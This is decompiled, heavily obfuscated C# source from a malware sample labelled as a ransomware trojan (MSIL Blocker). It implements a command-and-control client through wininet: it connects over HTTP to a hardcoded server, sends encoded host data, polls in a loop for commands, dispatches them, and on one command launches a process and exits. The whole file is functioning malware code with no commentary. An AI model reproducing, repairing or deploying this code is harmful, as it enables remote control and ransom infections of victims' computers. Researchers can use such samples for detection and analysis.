// Decompiled with JetBrains decompiler
// Type: M6-n.2&KqI
// Assembly: ]\r, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 954C3D5E-708C-4DD0-82B7-DE2C5BD9F148
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b8539742a30b177b50768aa3e2c5af8a1f70cde6bd248fc157300ef1b9642f75.exe

using M\u000E6\u002Dn\u0008;
using M\u000E6\u002Dn\u0008.\u0014\u003E;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace M\u000E6\u002Dn\u0008
{
  internal class \u0032\u0026KqI : \u0023\u005C2\u002F\u005BB
  {
    private const uint \u000D8\u0026 = 1;
    private const short \u000A\u001E\u0029\u0022iR\u0008\u002D\u0012 = 80;
    private const uint \u00091\u0023 = 3;
    private const uint \u000C\u002A\u0023U\u0017\u000DP\u0017 = 512;
    private const uint \u001B\u0011\u0020\u003C\u001C7\u002E = 19;
    private const uint r\u001E = 536870912;
    private const uint \u003D\u0005 = 43;
    private const uint \u0017q\u0024v\u003EV\u0026 = 200;
    private static IntPtr \u0032\u002EX\u0011 = IntPtr.Zero;
    private static Thread \u0009\u0020\u000E\u00039\u0025l = new Thread(new ThreadStart(\u0032\u0026KqI.\u0034\u0002));
    private static bool A\u005B\u0008\u0004P = false;
    private static string \u0007\u002A\u003C\u0012\u0008\u00201x = string.Empty;

    public static void \u0003\u001C\u0096\u001D\u0002\u0003\u001B\u001B()
    {
      if (\u0032\u0026KqI.A\u005B\u0008\u0004P)
        \u0032\u0026KqI.A\u005B\u0008\u0004P = false;
      if (\u0032\u0026KqI.\u0007\u002A\u003C\u0012\u0008\u00201x != string.Empty && \u0032\u0026KqI.\u0007\u002A\u003C\u0012\u0008\u00201x.IndexOf(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u002Dx\u0013\u003A\u0013\u001BK\u0095\u0001()) == -1)
        \u0032\u0026KqI.\u0007\u002A\u003C\u0012\u0008\u00201x = \u0032\u0026KqI.\u0007\u002A\u003C\u0012\u0008\u00201x + Environment.NewLine + \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0011bS\u0025\u0005\u0006\u0025\u001F\u000B();
      \u0032\u0026KqI.\u002A\u001A\u0080\u0027\u0008\u0082M();
    }

    private static void \u002A\u001A\u0080\u0027\u0008\u0082M()
    {
      IntPtr DX = \u0032\u0026KqI.\u0031U\u000D\u001E(m\u003D\u000D.\u0005\u0020\u001E7, 1U, (string) null, (string) null, 0U);
      if (DX != IntPtr.Zero)
      {
        if (\u0032\u0026KqI.\u0032\u002EX\u0011 != IntPtr.Zero)
          \u0032\u0026KqI.g\u001F\u0004hNB\u0019\u000F\u001E(\u0032\u0026KqI.\u0032\u002EX\u0011);
        \u0032\u0026KqI.\u0032\u002EX\u0011 = \u0032\u0026KqI.GS\u00180(DX, Encoding.Default.GetString(m\u003D\u000D.\u002A), (short) 80, (string) null, (string) null, 3U, 0U, IntPtr.Zero);
        if (\u0032\u0026KqI.\u0032\u002EX\u0011 != IntPtr.Zero)
        {
          byte[] numArray = \u0032\u0026KqI.\u0014\u0088(0U, (object) \u0029\u001D4\u003E\u0018\u000B\u0025.\u0028\u000B\u001D\u0018\u0024B\u0028\u0020\u001F(), false);
          if (numArray.Length > 0 && new \u0032\u0026KqI.\u0023\u001F\u0002M\u000FN\u0006\u002E\u0020(numArray).\u005C`\u001A\u003B\u0025 == 1U)
          {
            \u0032\u0026KqI.\u0007\u002A\u003C\u0012\u0008\u00201x = \u0032\u0026KqI.\u0007\u002A\u003C\u0012\u0008\u00201x.Substring(0, \u0032\u0026KqI.\u0007\u002A\u003C\u0012\u0008\u00201x.IndexOf(Environment.NewLine));
            \u0032\u0026KqI.WF\u002E\u000E\u001B();
            return;
          }
        }
        \u0032\u0026KqI.g\u001F\u0004hNB\u0019\u000F\u001E(DX);
      }
      Thread.Sleep(1000 * m\u003D\u000D.\u00323\u0014\u0003\u0023);
      \u0032\u0026KqI.\u0003\u001C\u0096\u001D\u0002\u0003\u001B\u001B();
    }

    private static void WF\u002E\u000E\u001B()
    {
      if (new \u0032\u0026KqI.\u0023\u001F\u0002M\u000FN\u0006\u002E\u0020(\u0032\u0026KqI.\u0014\u0088(1U, (object) new \u0032\u0026KqI.f\u000E\u0004\u0022d\u0019\u0012\u001F\u002A(m\u003D\u000D.\u003D\u003Fg\u000A3g3, (int) m\u003D\u000D.\u000C\u0011A\u0001, m\u003D\u000D.), true)).\u005C`\u001A\u003B\u0025 == 1U)
      {
        \u0032\u0026KqI.A\u005B\u0008\u0004P = true;
        \u0032\u0026KqI.\u0009\u0020\u000E\u00039\u0025l.Start();
      }
      else
        \u0032\u0026KqI.\u0003\u001C\u0096\u001D\u0002\u0003\u001B\u001B();
    }

    private static void \u0034\u0002()
    {
      while (\u0032\u0026KqI.A\u005B\u0008\u0004P)
      {
        try
        {
          \u0023\u005C2\u002F\u005BB.\u0025\u0016E\u0002(new \u0032\u0026KqI.\u0023\u001F\u0002M\u000FN\u0006\u002E\u0020(\u0032\u0026KqI.\u0014\u0088(2U, (object) null, true)));
        }
        catch
        {
        }
        Thread.Sleep(1000 * m\u003D\u000D.\u00323\u0014\u0003\u0023);
      }
    }

    public static void O\u0025L()
    {
      \u0032\u0026KqI.\u0023\u001F\u0002M\u000FN\u0006\u002E\u0020 mN = new \u0032\u0026KqI.\u0023\u001F\u0002M\u000FN\u0006\u002E\u0020(\u0032\u0026KqI.\u0014\u0088(3U, (object) null, true));
      if (mN.\u005C`\u001A\u003B\u0025 == 1U)
      {
        string str = Encoding.Default.GetString(mN.\u0021\u001E\u0023\u001D\u0021\u003A\u0098\u000F).Trim(new char[1]);
        if (!(str != string.Empty))
          return;
        \u0033\u0017O\u0002.BB\u000C();
        if (!VG.\u00397\u0002(str))
          Process.Start(m\u003D\u000D.\u001A\u002B\u001B\u0021\u0026NA);
        Environment.Exit(0);
      }
      else
        \u0032\u0026KqI.\u0003\u001C\u0096\u001D\u0002\u0003\u001B\u001B();
    }

    private static byte[] \u0014\u0088(uint _param0, object _param1, bool _param2)
    {
      IntPtr num1 = \u0032\u0026KqI.\u0007\u003D(\u0032\u0026KqI.\u0032\u002EX\u0011, \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.d\u0014\u0014\u0028\u0007(), m\u003D\u000D.tkF\u00A1\u000A\u003A, (string) null, (string) null, (string[]) null, 2214917888U, IntPtr.Zero);
      if (num1 != IntPtr.Zero)
      {
        byte[] numArray1 = new byte[0];
        byte[] numArray2;
        if (_param2)
        {
          numArray2 = VG.\u0016`\u0018\u0029\u0088((object) new \u0032\u0026KqI.Ek5(m\u003D\u000D.\u0029\u0020\u0018, VG.\u0021\u0029Z(), _param0, VG.\u0016`\u0018\u0029\u0088(_param1)));
          \u0029\u001D4\u003E\u0018\u000B\u0025.\u00132\u0025\u001C\u0004qPa(ref numArray2);
        }
        else
          numArray2 = VG.\u0016`\u0018\u0029\u0088(_param1);
        if (\u0032\u0026KqI.\u0028\u0009\u001F\u000A\u0023(num1, \u0032\u0026KqI.\u0007\u002A\u003C\u0012\u0008\u00201x, (uint) \u0032\u0026KqI.\u0007\u002A\u003C\u0012\u0008\u00201x.Length, numArray2, (uint) numArray2.Length))
        {
          IntPtr num2 = Marshal.AllocHGlobal(4);
          uint num3 = 4;
          if (\u0032\u0026KqI.\u003F\u001E\u002B\u0021\u0008\u0021i\u001CD(num1, 536870931U, num2, ref num3, (object) null) && Marshal.ReadInt32(num2) == 200)
          {
            Marshal.FreeHGlobal(num2);
            IntPtr num4 = Marshal.AllocHGlobal(128);
            uint num5 = 128;
            if (\u0032\u0026KqI.\u003F\u001E\u002B\u0021\u0008\u0021i\u001CD(num1, 43U, num4, ref num5, (object) null))
            {
              string str = Marshal.PtrToStringUni(num4).TrimStart();
              if (str.StartsWith(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.GCJX\u002F\u0003\u0021()))
                \u0032\u0026KqI.\u0007\u002A\u003C\u0012\u0008\u00201x = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u002E\u0013\u002C\u003C\u000B\u001BYR() + str.Substring(0, str.IndexOf(';')) + Environment.NewLine;
            }
            Marshal.FreeHGlobal(num4);
            IntPtr num6 = Marshal.AllocHGlobal(512);
            uint length = 512;
            \u0032\u0026KqI.\u002A\u00173(num1, num6, length, ref length);
            \u0032\u0026KqI.g\u001F\u0004hNB\u0019\u000F\u001E(num1);
            byte[] destination = new byte[(IntPtr) length];
            Marshal.Copy(num6, destination, 0, (int) length);
            Marshal.FreeHGlobal(num6);
            return destination;
          }
          Marshal.FreeHGlobal(num2);
        }
        \u0032\u0026KqI.g\u001F\u0004hNB\u0019\u000F\u001E(num1);
      }
      return new byte[0];
    }

    [DllImport("wininet", EntryPoint = "InternetOpen", CharSet = CharSet.Unicode)]
    private static extern IntPtr \u0031U\u000D\u001E(
      string _param0,
      uint _param1,
      string _param2,
      string _param3,
      uint _param4);

    [DllImport("wininet", EntryPoint = "InternetCloseHandle", CharSet = CharSet.Unicode)]
    private static extern bool g\u001F\u0004hNB\u0019\u000F\u001E(IntPtr _param0);

    [DllImport("wininet", EntryPoint = "InternetConnect", CharSet = CharSet.Unicode)]
    private static extern IntPtr GS\u00180(
      IntPtr DX,
      string _param1,
      short _param2,
      string _param3,
      string _param4,
      uint LP,
      uint _param6,
      IntPtr _param7);

    [DllImport("wininet", EntryPoint = "HttpOpenRequest", CharSet = CharSet.Unicode)]
    private static extern IntPtr \u0007\u003D(
      IntPtr _param0,
      string _param1,
      string _param2,
      string _param3,
      string _param4,
      string[] _param5,
      uint _param6,
      IntPtr _param7);

    [DllImport("wininet", EntryPoint = "HttpSendRequest", CharSet = CharSet.Unicode)]
    private static extern bool \u0028\u0009\u001F\u000A\u0023(
      IntPtr _param0,
      string _param1,
      uint _param2,
      byte[] _param3,
      uint _param4);

    [DllImport("wininet", EntryPoint = "HttpQueryInfo", CharSet = CharSet.Unicode)]
    private static extern bool \u003F\u001E\u002B\u0021\u0008\u0021i\u001CD(
      IntPtr _param0,
      uint _param1,
      IntPtr _param2,
      ref uint _param3,
      object _param4);

    [DllImport("wininet", EntryPoint = "InternetReadFile", CharSet = CharSet.Unicode)]
    private static extern bool \u002A\u00173(
      IntPtr _param0,
      IntPtr FA,
      uint _param2,
      ref uint _param3);

    private enum \u0004\u0001\u001E : uint
    {
      \u0004\u000CJ\u001B\u0001\u002E\u0001 = 0,
      \u0005\u0091y\u0007V5\u0021NR = 0,
      f\u0002\u0011 = 1,
      h\u0014 = 1,
      S\u001Bl\u000F\u0018 = 2,
      H\u00185 = 3,
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct \u0023\u001F\u0002M\u000FN\u0006\u002E\u0020
    {
      [MarshalAs(UnmanagedType.U4)]
      public uint XZv\u0009\u0017;
      [MarshalAs(UnmanagedType.U4)]
      public uint \u005C`\u001A\u003B\u0025;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]
      public byte[] \u0021\u001E\u0023\u001D\u0021\u003A\u0098\u000F;

      public \u0023\u001F\u0002M\u000FN\u0006\u002E\u0020(byte[] _param1)
      {
        \u0029\u001D4\u003E\u0018\u000B\u0025.\u009F\u0016\u0004\u002C\u002CU\u001C\u000F(ref _param1);
        GCHandle gcHandle = GCHandle.Alloc((object) _param1, GCHandleType.Pinned);
        IntPtr ptr = gcHandle.AddrOfPinnedObject();
        gcHandle.Free();
        this = (\u0032\u0026KqI.\u0023\u001F\u0002M\u000FN\u0006\u002E\u0020) Marshal.PtrToStructure(ptr, typeof (\u0032\u0026KqI.\u0023\u001F\u0002M\u000FN\u0006\u002E\u0020));
      }
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct Ek5
    {
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 38)]
      public byte[] \u0011\u001Ca\u0028\u0015\u0010X;
      [MarshalAs(UnmanagedType.U4)]
      public uint \u0025\u001E\u0002;
      [MarshalAs(UnmanagedType.U4)]
      public uint \u0014K\u003CG\u002F9\u0027\u0010\u0021;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]
      public byte[] \u0023\u0025\u0024\u0012\u0019`;

      public Ek5(string _param1, uint _param2, uint _param3, byte[] _param4)
      {
        this.\u0011\u001Ca\u0028\u0015\u0010X = new byte[38];
        this.\u0023\u0025\u0024\u0012\u0019` = new byte[64];
        this.\u0025\u001E\u0002 = _param2;
        this.\u0014K\u003CG\u002F9\u0027\u0010\u0021 = _param3;
        Array.Copy((Array) Encoding.Default.GetBytes(_param1), 0, (Array) this.\u0011\u001Ca\u0028\u0015\u0010X, 0, _param1.Length);
        Array.Copy((Array) _param4, 0, (Array) this.\u0023\u0025\u0024\u0012\u0019`, 0, _param4.Length);
      }
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct f\u000E\u0004\u0022d\u0019\u0012\u001F\u002A
    {
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 20)]
      public byte[] \u0017\u0086H\u0028\u000F\u0023\u0024;
      [MarshalAs(UnmanagedType.U4)]
      public int \u0024V\u0024\u001B;
      [MarshalAs(UnmanagedType.U4)]
      public int \u008DN\u000Bu\u0025\u000C\u0025;

      public f\u000E\u0004\u0022d\u0019\u0012\u001F\u002A(string _param1, int _param2, int _param3)
      {
        this.\u0017\u0086H\u0028\u000F\u0023\u0024 = new byte[20];
        this.\u0024V\u0024\u001B = _param2;
        this.\u008DN\u000Bu\u0025\u000C\u0025 = _param3;
        Array.Copy((Array) Encoding.Default.GetBytes(_param1), 0, (Array) this.\u0017\u0086H\u0028\u000F\u0023\u0024, 0, _param1.Length);
      }
    }
  }
}
